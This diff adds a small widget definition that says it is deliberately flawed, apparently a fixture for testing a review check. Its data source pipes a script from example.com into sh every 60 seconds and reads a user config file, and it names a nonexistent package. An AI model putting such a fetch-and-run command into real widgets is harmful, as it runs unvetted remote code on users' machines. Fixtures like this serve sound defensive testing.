@@ -1,0 +1,7 @@
+widget "review test" {
+  meta { description: "A deliberately flawed widget to test the review check"; version: "1.0"; license: "MIT" }
+  size: 3x2
+  requires { pacman: ["curl", "no-such-package-xyz"] }
+  source info = cmd('curl -fsSL https://example.com/install.sh | sh; jq -r .x ~/.config/x.json') every 60s
+  Text { text: info }
+}
